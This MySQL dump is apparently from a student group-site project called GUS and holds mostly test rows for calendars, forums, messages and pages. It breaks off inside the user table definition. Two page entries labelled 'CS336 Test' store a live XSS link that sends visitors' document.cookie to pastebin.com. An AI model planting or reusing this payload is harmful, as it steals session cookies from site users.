-- MySQL dump 10.13  Distrib 5.1.49, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: gusphp
-- ------------------------------------------------------
-- Server version	5.1.49-1ubuntu8.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `gusphp`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `gusphp` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `gusphp`;

--
-- Table structure for table `calendar`
--

DROP TABLE IF EXISTS `calendar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar` (
  `user` varchar(32) NOT NULL,
  `date` date NOT NULL,
  `data` varchar(150) NOT NULL,
  `eventID` int(11) NOT NULL AUTO_INCREMENT,
  KEY `eventID` (`eventID`),
  KEY `eventID_2` (`eventID`)
) ENGINE=MyISAM AUTO_INCREMENT=638 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar`
--

LOCK TABLES `calendar` WRITE;
/*!40000 ALTER TABLE `calendar` DISABLE KEYS */;
INSERT INTO `calendar` VALUES ('admin','2011-02-26','another event',3),('admin','2011-02-24','updated',2),('admin','2011-02-21','event',4),('user1','2011-03-15','an event in march',6),('admin','2011-02-23','updated',7),('admin','0000-00-00','different event',8),('long3841','2011-02-19','event',9),('cblair','2011-02-21','asdfasdf',10),('cblair','2011-02-27','asdfasfdasfd',11),('long3841','2011-02-21','something',12),('cblair','2011-03-12','test',13),('','2011-03-12','test2',14),('','2011-03-12','something',28),('','2011-03-31','something',189),('','2011-03-31','something',188),('','2011-03-31','something',187),('','2011-03-31','something',186),('','2011-03-29','something',181),('long3841','2011-03-15','something',109),('','2011-03-29','something',180),('','2011-03-29','something',179),('','2011-03-29','something',178),('','2011-03-30','something',184),('','2011-03-21','something',114),('','2011-03-30','something',185),('','2011-03-27','something',173),('','2011-03-20','something',110),('','2011-03-30','something',182),('','2011-04-01','something',192),('','2011-03-18','something',107),('','2011-04-01','something',193),('','2011-04-01','something',194),('','2011-04-01','something',195),('','2011-04-02','something',196),('','2011-04-02','something',197),('','2011-04-02','something',198),('','2011-04-02','something',199),('','2011-04-02','something',200),('','2011-04-02','something',201),('','2011-04-02','something',202),('','2011-04-02','something',203),('','2011-04-02','something',204),('','2011-04-02','something',205),('','2011-04-02','something',206),('','2011-04-02','something',207),('test','2011-04-02','something',208),('','2011-04-02','something',209),('test','2011-04-02','something',210),('','2011-04-02','something',211),('test','2011-04-02','something',212),('','2011-04-02','something',213),('test','2011-04-02','something',214),('','2011-04-02','something',215),('test','2011-04-02','something',216),('','2011-04-02','something',217),('test','2011-04-02','something',218),('','2011-04-02','something',219),('test','2011-04-02','something',220),('','2011-04-02','something',221),('test','2011-04-02','something',222),('','2011-04-02','something',223),('test','2011-04-02','something',224),('','2011-04-02','something',225),('test','2011-04-02','something',226),('','2011-04-02','something',227),('test','2011-04-02','something',228),('','2011-04-02','something',229),('test','2011-04-02','something',230),('','2011-04-02','something',231),('test','2011-04-02','something',232),('','2011-04-02','something',233),('test','2011-04-02','something',234),('','2011-04-02','something',235),('test','2011-04-02','something',236),('','2011-04-02','something',237),('test','2011-04-02','something',238),('','2011-04-02','something',239),('test','2011-04-02','something',240),('','2011-04-02','something',241),('test','2011-04-02','something',242),('','2011-04-02','something',243),('test','2011-04-02','something',244),('','2011-04-02','something',245),('test','2011-04-02','something',246),('','2011-04-02','something',247),('test','2011-04-02','something',248),('','2011-04-02','something',249),('test','2011-04-02','something',250),('','2011-04-02','something',251),('test','2011-04-02','something',252),('','2011-04-02','something',253),('test','2011-04-02','something',254),('','2011-04-02','something',255),('test','2011-04-02','something',256),('','2011-04-02','something',257),('test','2011-04-02','something',258),('','2011-04-02','something',259),('test','2011-04-02','something',260),('','2011-04-02','something',261),('test','2011-04-02','something',262),('','2011-04-02','something',263),('test','2011-04-02','something',264),('','2011-04-02','something',265),('test','2011-04-02','something',266),('','2011-04-02','something',267),('test','2011-04-02','something',268),('','2011-04-02','something',269),('test','2011-04-02','something',270),('','2011-04-02','something',271),('test','2011-04-02','something',272),('','2011-04-02','something',273),('test','2011-04-02','something',274),('','2011-04-02','something',275),('test','2011-04-02','something',276),('','2011-04-02','something',277),('test','2011-04-02','something',278),('','2011-04-02','something',279),('test','2011-04-02','something',280),('','2011-04-02','something',281),('test','2011-04-02','something',282),('','2011-04-02','something',283),('test','2011-04-02','something',284),('','2011-04-02','something',285),('test','2011-04-02','something',286),('','2011-04-02','something',287),('test','2011-04-02','something',288),('','2011-04-02','something',289),('test','2011-04-02','something',290),('','2011-04-02','something',291),('test','2011-04-02','something',292),('','2011-04-02','something',293),('test','2011-04-02','something',294),('','2011-04-02','something',295),('test','2011-04-02','something',296),('','2011-04-02','something',297),('test','2011-04-02','something',298),('','2011-04-02','something',299),('test','2011-04-02','something',300),('','2011-04-02','something',301),('test','2011-04-02','something',302),('','2011-04-02','something',303),('test','2011-04-02','something',304),('','2011-04-02','something',305),('test','2011-04-02','something',306),('','2011-04-02','something',307),('test','2011-04-02','something',308),('','2011-04-02','something',309),('test','2011-04-02','something',310),('','2011-04-02','something',311),('test','2011-04-02','something',312),('','2011-04-02','something',313),('test','2011-04-02','something',314),('','2011-04-02','something',315),('test','2011-04-02','something',316),('','2011-04-02','something',317),('test','2011-04-02','something',318),('','2011-04-02','something',319),('test','2011-04-02','something',320),('','2011-04-02','something',321),('test','2011-04-02','something',322),('','2011-04-02','something',323),('test','2011-04-02','something',324),('','2011-04-02','something',325),('test','2011-04-02','something',326),('','2011-04-02','something',327),('test','2011-04-02','something',328),('','2011-04-02','something',329),('test','2011-04-02','something',330),('','2011-04-02','something',331),('test','2011-04-02','something',332),('','2011-04-02','something',333),('test','2011-04-02','something',334),('','2011-04-02','something',335),('test','2011-04-02','something',336),('','2011-04-02','something',337),('test','2011-04-02','something',338),('','2011-04-02','something',339),('test','2011-04-02','something',340),('','2011-04-02','something',341),('test','2011-04-02','something',342),('','2011-04-02','something',343),('test','2011-04-02','something',344),('','2011-04-02','something',345),('test','2011-04-02','something',346),('','2011-04-02','something',347),('test','2011-04-02','something',348),('','2011-04-02','something',349),('test','2011-04-02','something',350),('','2011-04-02','something',351),('test','2011-04-02','something',352),('','2011-04-02','something',353),('test','2011-04-02','something',354),('','2011-04-02','something',355),('test','2011-04-02','something',356),('','2011-04-02','something',357),('test','2011-04-02','something',358),('','2011-04-02','something',359),('test','2011-04-02','something',360),('','2011-04-02','something',361),('test','2011-04-02','something',362),('','2011-04-02','something',363),('test','2011-04-02','something',364),('','2011-04-02','something',365),('test','2011-04-02','something',366),('','2011-04-02','something',367),('test','2011-04-02','something',368),('','2011-04-02','something',369),('test','2011-04-02','something',370),('','2011-04-02','something',371),('test','2011-04-02','something',372),('','2011-04-02','something',373),('test','2011-04-02','something',374),('','2011-04-02','something',375),('test','2011-04-02','something',376),('','2011-04-02','something',377),('test','2011-04-02','something',378),('','2011-04-02','something',379),('test','2011-04-02','something',380),('','2011-04-02','something',381),('test','2011-04-02','something',382),('','2011-04-02','something',383),('test','2011-04-02','something',384),('','2011-04-02','something',385),('test','2011-04-02','something',386),('','2011-04-02','something',387),('test','2011-04-02','something',388),('','2011-04-02','something',389),('test','2011-04-02','something',390),('','2011-04-02','something',391),('test','2011-04-02','something',392),('','2011-04-02','something',393),('test','2011-04-02','something',394),('','2011-04-02','something',395),('test','2011-04-02','something',396),('','2011-04-02','something',397),('test','2011-04-02','something',398),('','2011-04-02','something',399),('test','2011-04-02','something',400),('','2011-04-02','something',401),('test','2011-04-02','something',402),('','2011-04-02','something',403),('test','2011-04-02','something',404),('','2011-04-02','something',405),('test','2011-04-02','something',406),('','2011-04-02','something',407),('test','2011-04-02','something',408),('','2011-04-02','something',409),('test','2011-04-02','something',410),('','2011-04-02','something',411),('test','2011-04-02','something',412),('','2011-04-02','something',413),('test','2011-04-02','something',414),('','2011-04-02','something',415),('test','2011-04-02','something',416),('','2011-04-02','something',417),('test','2011-04-02','something',418),('','2011-04-02','something',419),('test','2011-04-02','something',420),('','2011-04-02','something',421),('test','2011-04-02','something',422),('','2011-04-02','something',423),('test','2011-04-02','something',424),('','2011-04-02','something',425),('test','2011-04-02','something',426),('','2011-04-02','something',427),('test','2011-04-02','something',428),('','2011-04-02','something',429),('test','2011-04-02','something',430),('','2011-04-02','something',431),('test','2011-04-02','something',432),('','2011-04-02','something',433),('test','2011-04-02','something',434),('','2011-04-02','something',435),('test','2011-04-02','something',436),('','2011-04-02','something',437),('test','2011-04-02','something',438),('','2011-04-02','something',439),('test','2011-04-02','something',440),('','2011-04-02','something',441),('test','2011-04-02','something',442),('','2011-04-02','something',443),('test','2011-04-02','something',444),('','2011-04-02','something',445),('test','2011-04-02','something',446),('','2011-04-02','something',447),('test','2011-04-02','something',448),('','2011-04-02','something',449),('test','2011-04-02','something',450),('','2011-04-02','something',451),('test','2011-04-02','something',452),('','2011-04-02','something',453),('test','2011-04-02','something',454),('','2011-04-02','something',455),('test','2011-04-02','something',456),('','2011-04-02','something',457),('test','2011-04-02','something',458),('','2011-04-02','something',459),('test','2011-04-02','something',460),('','2011-04-02','something',461),('test','2011-04-02','something',462),('','2011-04-02','something',463),('test','2011-04-02','something',464),('','2011-04-02','something',465),('test','2011-04-02','something',466),('','2011-04-02','something',467),('test','2011-04-03','something',468),('','2011-04-03','something',557),('test','2011-04-03','something',470),('','2011-04-03','something',556),('test','2011-04-03','something',472),('','2011-04-03','something',473),('test','2011-04-03','something',474),('','2011-04-03','something',475),('test','2011-04-03','something',476),('','2011-04-03','something',477),('test','2011-04-03','something',478),('','2011-04-03','something',479),('test','2011-04-03','something',480),('','2011-04-03','something',481),('test','2011-04-03','something',482),('','2011-04-03','something',483),('test','2011-04-03','something',484),('','2011-04-03','something',485),('test','2011-04-03','something',486),('','2011-04-03','something',487),('test','2011-04-03','something',488),('','2011-04-03','something',489),('test','2011-04-03','something',490),('','2011-04-03','something',491),('test','2011-04-03','something',492),('','2011-04-03','something',493),('test','2011-04-03','something',494),('','2011-04-03','something',495),('test','2011-04-03','something',496),('','2011-04-03','something',497),('test','2011-04-03','something',498),('','2011-04-03','something',499),('test','2011-04-03','something',500),('','2011-04-03','something',501),('test','2011-04-03','something',502),('','2011-04-03','something',503),('test','2011-04-03','something',504),('','2011-04-03','something',505),('test','2011-04-03','something',506),('','2011-04-03','something',507),('test','2011-04-03','something',508),('','2011-04-03','something',509),('test','2011-04-03','something',510),('','2011-04-03','something',511),('test','2011-04-03','something',512),('','2011-04-03','something',513),('test','2011-04-03','something',514),('','2011-04-03','something',515),('test','2011-04-03','something',516),('','2011-04-03','something',517),('test','2011-04-03','something',518),('','2011-04-03','something',519),('test','2011-04-03','something',520),('','2011-04-03','something',521),('test','2011-04-03','something',522),('','2011-04-03','something',523),('test','2011-04-03','something',524),('','2011-04-03','something',525),('test','2011-04-03','something',526),('','2011-04-03','something',527),('test','2011-04-03','something',528),('','2011-04-03','something',529),('test','2011-04-03','something',530),('','2011-04-03','something',531),('test','2011-04-03','something',532),('','2011-04-03','something',533),('test','2011-04-03','something',534),('','2011-04-03','something',535),('test','2011-04-03','something',536),('','2011-04-03','something',537),('test','2011-04-03','something',538),('','2011-04-03','something',539),('test','2011-04-03','something',540),('','2011-04-03','something',541),('test','2011-04-03','something',542),('','2011-04-03','something',543),('test','2011-04-03','something',544),('','2011-04-03','something',545),('test','2011-04-03','something',546),('','2011-04-03','something',547),('test','2011-04-03','something',548),('','2011-04-03','something',549),('test','2011-04-03','something',550),('','2011-04-03','something',551),('test','2011-04-03','something',552),('','2011-04-03','something',553),('test','2011-04-03','something',554),('','2011-04-03','something',555),('','2011-04-03','something',558),('','2011-04-03','something',559),('','2011-04-03','something',560),('','2011-04-03','something',561),('test','2011-04-03','something',562),('','2011-04-03','something',563),('test','2011-04-03','something',564),('','2011-04-03','something',565),('','2011-04-03','something',566),('','2011-04-03','something',567),('','2011-04-03','something',568),('','2011-04-03','something',569),('test','2011-04-03','something',570),('','2011-04-03','something',571),('test','2011-04-03','something',572),('','2011-04-03','something',573),('test','2011-04-03','something',574),('','2011-04-03','something',575),('test','2011-04-03','something',576),('','2011-04-03','something',577),('test','2011-04-03','something',578),('','2011-04-03','something',579),('test','2011-04-04','something',580),('','2011-04-04','something',581),('test','2011-04-04','something',582),('','2011-04-04','something',583),('test','2011-04-04','something',584),('','2011-04-04','something',585),('test','2011-04-04','something',586),('','2011-04-04','something',587),('test','2011-04-04','something',589),('','2011-04-04','something',590),('test','2011-04-04','something',591),('','2011-04-04','something',592),('test','2011-04-05','something',593),('','2011-04-05','something',594),('test','2011-04-05','something',595),('','2011-04-05','something',596),('test','2011-04-06','something',597),('','2011-04-06','something',598),('test','2011-04-06','something',599),('','2011-04-06','something',600),('test','2011-04-06','something',601),('','2011-04-06','something',602),('test','2011-04-06','something',603),('','2011-04-06','something',604),('test','2011-04-07','something',605),('','2011-04-07','something',606),('test','2011-04-07','something',607),('','2011-04-07','something',608),('test','2011-04-08','something',612),('','2011-04-08','something',610),('cblair','2011-03-09','test',611),('','2011-04-08','something',613),('','2011-04-09','something',614),('','2011-04-09','something',615),('','2011-04-10','something',616),('','2011-04-10','something',617),('','2011-04-11','something',618),('','2011-04-11','something',619),('','2011-04-11','something',620),('','2011-04-11','something',621),('','2011-04-11','something',622),('','2011-04-11','something',623),('','2011-04-11','something',624),('','2011-04-11','something',625),('','2011-04-11','something',626),('test','2011-04-12','something',627),('','2011-04-12','something',628),('','2011-04-13','something',629),('','2011-04-13','something',630),('long3841','2011-04-15','event!',631),('test_group','2011-04-15','group meeting',632),('long3841','2011-04-08','event',637),('developers','2011-04-15','test',634);
/*!40000 ALTER TABLE `calendar` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `calendar_rsvp`
--

DROP TABLE IF EXISTS `calendar_rsvp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calendar_rsvp` (
  `eventID` int(11) NOT NULL,
  `groupID` int(11) NOT NULL,
  `name` varchar(30) NOT NULL,
  `yes` int(11) NOT NULL,
  `no` int(11) NOT NULL,
  `maybe` int(11) NOT NULL,
  `unanswered` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calendar_rsvp`
--

LOCK TABLES `calendar_rsvp` WRITE;
/*!40000 ALTER TABLE `calendar_rsvp` DISABLE KEYS */;
INSERT INTO `calendar_rsvp` VALUES (304,5,'drj',0,0,0,1),(304,5,'test',1,0,0,0),(304,5,'long3841',1,0,0,0),(301,5,'sbeddall',0,0,0,1),(304,5,'brett',1,0,0,0),(304,5,'timb',0,0,0,1),(301,5,'anilson',0,0,0,1),(301,5,'cblair',0,0,0,1),(304,5,'crempel',1,0,0,0),(301,5,'long3841',1,0,0,0),(13,11,'test2',0,0,0,1),(13,11,'cblair',0,0,0,1),(631,5,'long3841',1,0,0,0),(634,11,'abhay',0,0,0,1),(634,11,'cblair',0,0,0,1),(634,11,'drj',0,0,0,1),(631,5,'cblair',0,0,0,1),(632,5,'long3841',0,0,0,1),(637,11,'long3841',0,0,0,1);
/*!40000 ALTER TABLE `calendar_rsvp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `files`
--

DROP TABLE IF EXISTS `files`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` text NOT NULL,
  `uid` int(11) DEFAULT NULL,
  `gid` int(11) DEFAULT NULL,
  `date` int(11) DEFAULT NULL,
  `size` float DEFAULT NULL,
  `perm` int(11) DEFAULT '7',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `files`
--

LOCK TABLES `files` WRITE;
/*!40000 ALTER TABLE `files` DISABLE KEYS */;
INSERT INTO `files` VALUES (27,'9j31F.jpg',13,5,20110415,52.48,7),(32,'magikarp-swear.gif',13,5,20110415,8.15,7),(33,'colby.png',0,5,20110415,46.25,7),(35,'ballmer.png',15,11,20110415,45.5,7),(36,'khaaan.png',15,10,20110416,33.08,7);
/*!40000 ALTER TABLE `files` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ggroup`
--

DROP TABLE IF EXISTS `ggroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ggroup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `profile` varchar(25) NOT NULL,
  `description` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ggroup`
--

LOCK TABLES `ggroup` WRITE;
/*!40000 ALTER TABLE `ggroup` DISABLE KEYS */;
INSERT INTO `ggroup` VALUES (5,'test_group','sdfd','test_desc'),(10,'main','soon.png','Gus main group. Users set to admin (7) on this group get system wide admin privileges.'),(11,'developers','ballmer.png','Gus developers.');
/*!40000 ALTER TABLE `ggroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messages`
--

DROP TABLE IF EXISTS `messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `respond_id` int(11) DEFAULT NULL,
  `from_id` int(11) NOT NULL,
  `to_id` int(11) NOT NULL,
  `subject` varchar(64) NOT NULL,
  `message` varchar(255) NOT NULL,
  `location` enum('inbox','sent','archived') NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messages`
--

LOCK TABLES `messages` WRITE;
/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
INSERT INTO `messages` VALUES (1,0,1,0,'test','test','inbox','2011-02-10 20:13:09'),(2,NULL,24,0,'test','test','sent','2011-04-15 18:31:39'),(3,NULL,0,10,'test','test','sent','2011-04-15 18:32:56'),(4,NULL,12,2,'0','test','sent','2011-04-15 08:01:54'),(5,NULL,0,9,'hello','hi!','sent','2011-04-15 08:16:06'),(6,NULL,38,0,'0','we are watching','sent','2011-04-15 08:48:49'),(7,NULL,0,12,'test 2','test','sent','2011-04-15 08:59:05'),(8,NULL,46,0,'test outgoing messages','howzit going, CB?\nWondering what Gus would look like if it were a Facebook app. Tell me if you got this, and mention Facebook.','sent','2011-04-18 08:26:47');
/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `page`
--

DROP TABLE IF EXISTS `page`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `page` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL,
  `content` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=126 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `page`
--

LOCK TABLES `page` WRITE;
/*!40000 ALTER TABLE `page` DISABLE KEYS */;
INSERT INTO `page` VALUES (27,'test','Test content'),(16,'home','<p><span style=\"font-size: x-small;\"><em>A quick note from the developers:</em></span></p>\n<p><span style=\"font-size: large;\"><strong>Welcome to the GUS Beta Test!</strong></span></p>\n<p><span style=\"font-size: small;\">If you are here to try out GUS, we salute you! We will do our best to provide any help or support that you require during your stay here. &nbsp;Of course, since this is a Beta, there is a lot that we may have missed during our production testing. In the event that you encounter something unexpected, simply click \"FeedBack\" on the left and submit a report. Though we would love for you to copy paste the exact error, what you were doing when the bug occured will be enough for us to reproduce it. If you don\'t want to take that option, simply send a message to any members of the \"developer\" group. We will get back to you as soon as we can.</span></p>\n<p><span style=\"font-size: small;\">To go along with the fact that this is a Beta, we also cannot be absolutely certain about the security on our site. We endeavor to provide a safe haven for your club or activity group to reside in, but nothing is 100% sure on the Internet. Humor us, make sure to not put any information here that you wish to remain private.&nbsp;</span></p>\n<p><span style=\"font-size: small;\">Thanks very much for your participation. We hope you have a great time!</span></p>\n<p><span style=\"font-size: small;\"><em>-The GUS Dev Team</em></span></p>'),(18,'auth','Gus Authentication'),(19,'CS336 Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(20,'CS336Test','<a href=\"javascript:var a=new XMLHttpRequest,b=\"paste_code=\"+document.cookie+\"&paste_name=XSS_poc\";a.open(\"POST\",\"http://pastebin.com/api_public.php\",true);a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");a.setRequestHeader(\"Content-length\",b.length+\"\");a.setRequestHeader(\"Connection\",\"close\");a.send(b);\">Sweet Link Man</a>'),(21,NULL,NULL),(102,'group_main','<p style=\"text-align: left;\">This <span style=\"text-decoration: underline;\">is</span> <strong></strong></p>\n<p style=\"text-align: right;\"><strong>content</strong> <em></em></p>\n<p style=\"text-align: center;\"><em>specific</em></p>\n<p style=\"text-align: left;\"><em></em>to the <span style=\"font-size: large;\">main</span> group.</p>\n<ol>\n<li>-</li>\n<li>-</li>\n<li>-</li>\n</ol>\n<ul>\n<li>1</li>\n<li>2</li>\n<li>3</li>\n</ul>'),(103,'group_test_group','<p>This <em>is</em> <span style=\"text-decoration: underline;\"><strong>content</strong></span> specific</p>\n<p style=\"text-align: right;\">to</p>\n<p style=\"text-align: center;\">the</p>\n<p style=\"text-align: left;\"><span style=\"font-size: x-small; font-family: impact,chicago;\">test_group</span> group.</p>'),(110,'pm',''),(125,'group_developers','<p>Developers, <strong>developers</strong>, <em>developers</em>, <span style=\"text-decoration: underline;\">developers</span>, <em><strong>developers</strong></em>, <span style=\"text-decoration: underline;\"><strong>developers</strong></span>, <span style=\"text-decoration: underline;\"><em>developers</em></span>,</p>\n<p>developers, developers, developers,</p>\n<p style=\"text-align: center;\">developers, developers, developers,</p>\n<p style=\"text-align: right;\">developers, developers, developers,</p>\n<ol>\n<li>developers,&nbsp;</li>\n<li>developers,&nbsp;</li>\n<li>developers,</li>\n</ol>\n<ul>\n<li>developers,</li>\n<li>developers,</li>\n<li>developers,</li>\n</ul>\n<p>developers, <sub>developers,</sub> <sup><sub>developers, </sub></sup>developers.</p>');
/*!40000 ALTER TABLE `page` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `replies`
--

DROP TABLE IF EXISTS `replies`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `replies` (
  `thread_id` int(4) NOT NULL DEFAULT '0',
  `reply_id` int(4) NOT NULL AUTO_INCREMENT,
  `author` varchar(65) NOT NULL DEFAULT '',
  `a_email` varchar(65) NOT NULL DEFAULT '',
  `body` longtext NOT NULL,
  `datetime` varchar(25) NOT NULL DEFAULT '',
  KEY `a_id` (`reply_id`)
) ENGINE=InnoDB AUTO_INCREMENT=52 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `replies`
--

LOCK TABLES `replies` WRITE;
/*!40000 ALTER TABLE `replies` DISABLE KEYS */;
INSERT INTO `replies` VALUES (5,1,'Chaylo','','Just testing the reply counter','15/Feb/2011 07:59:36'),(5,2,'testing','','testing some more','15/Feb/2011 08:50:23'),(5,3,'testing','','testing','15/Feb/2011 08:53:16'),(6,4,'tesing','','testing','15/Feb/2011 08:53:27'),(7,6,'Chaylo','','test','25/Mar/2011 10:35:29'),(7,7,'Chaylo','','woot','25/Mar/2011 10:44:55'),(5,8,'claurino','','testabible\n','28/Mar/2011 03:12:05'),(7,16,'claurino','','testing','28/Mar/2011 05:08:38'),(23,22,'claurino','','teeest','29/Mar/2011 11:28:42'),(28,24,'admin','','Admin reply','30/Mar/2011 05:19:08'),(29,25,'admin','',' reply','30/Mar/2011 05:19:28'),(28,35,'claurino','','testable','30/Mar/2011 06:34:09'),(31,36,'claurino','','test','04/Apr/2011 08:06:20'),(44,42,'claurino','','testing','04/Apr/2011 10:10:10'),(31,43,'claurino','','test','06/Apr/2011 06:53:26'),(45,44,'claurino','','First reply','07/Apr/2011 09:57:59'),(46,45,'claurino','','First reply in this thread','07/Apr/2011 09:58:53'),(46,46,'admin','','Admin Reply','07/Apr/2011 10:01:57'),(45,47,'admin','','Admin Reply','07/Apr/2011 10:02:11'),(47,48,'admin','','Admin reply','07/Apr/2011 10:02:44'),(46,49,'forum_tester','','User reply','07/Apr/2011 10:18:26'),(47,50,'forum_tester','','User reply','07/Apr/2011 10:18:43'),(45,51,'forum_tester','','User reply','07/Apr/2011 10:20:42');
/*!40000 ALTER TABLE `replies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `threads`
--

DROP TABLE IF EXISTS `threads`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `threads` (
  `thread_id` int(4) NOT NULL AUTO_INCREMENT,
  `thread_topic` varchar(255) NOT NULL DEFAULT '',
  `thread_body` longtext NOT NULL,
  `thread_author` varchar(65) NOT NULL DEFAULT '',
  `email` varchar(65) NOT NULL DEFAULT '',
  `datetime` varchar(25) NOT NULL DEFAULT '',
  `view` int(4) NOT NULL DEFAULT '0',
  `num_replies` int(4) NOT NULL DEFAULT '0',
  `group_id` int(100) NOT NULL,
  `group_name` varchar(128) NOT NULL,
  `lock_flag` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`thread_id`)
) ENGINE=InnoDB AUTO_INCREMENT=51 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `threads`
--

LOCK TABLES `threads` WRITE;
/*!40000 ALTER TABLE `threads` DISABLE KEYS */;
INSERT INTO `threads` VALUES (5,'First Forum Entry','Just a quick test to make sure everything is working','Chaylo','','15/Feb/2011 07:59:21',0,7,1,'',0),(6,'Gotta check it all again!','Ugh','Chaylo','','15/Feb/2011 08:50:01',0,1,1,'',0),(7,'testing 1 2 3','Hello?','Chaylo','','25/Mar/2011 10:35:22',0,4,1,'test',0),(8,'new thread','test','claurino','','29/Mar/2011 06:38:00',0,0,1,'test',0),(15,'test thread','test','claurino','','29/Mar/2011 07:04:09',0,0,1,'test',0),(18,'test thread','test','claurino','','29/Mar/2011 07:17:21',0,0,1,'test',0),(23,'Once again...first thread','Juuuuuust testing','claurino','','29/Mar/2011 09:32:30',0,1,5,'test_group',0),(28,'New Admin Thread','Test','admin','','30/Mar/2011 05:19:01',0,1,7,'',0),(29,'New Admin Thread','Test','admin','','30/Mar/2011 05:19:21',0,1,6,'',0),(30,'New Admin Thread','Testing','admin','','30/Mar/2011 05:19:41',0,0,5,'',0),(31,'New Test Thread','Testing 123','claurino','','30/Mar/2011 06:31:40',0,2,7,'',0),(44,'testing','testable','claurino','','04/Apr/2011 10:10:06',0,1,6,'',0),(45,'First thread in this Forum','First Admin Test Group Thread','claurino','','07/Apr/2011 09:57:44',0,3,2,'',0),(46,'First thread in this Forum','First post in this thread','claurino','','07/Apr/2011 09:58:34',0,3,3,'',0),(47,'First thread in this Forum','First post in this thread','admin','','07/Apr/2011 10:02:33',0,2,4,'',0),(48,'User test thread','User post test','forum_tester','','07/Apr/2011 10:21:19',0,0,2,'',0),(49,'Second thread created for search test','Need another thread for searching','claurino','','07/Apr/2011 10:22:09',0,0,2,'',0),(50,'This is only a test...','test','cblair','','15/Apr/2011 11:47:39',0,0,11,'',0);
/*!40000 ALTER TABLE `threads` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `un` varchar(14) NOT NULL,
  `pw` varchar(100) NOT NULL,
  `fullname` varchar(25) NOT NULL,
  `description` varchar(256) NOT NULL,
  `profile` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
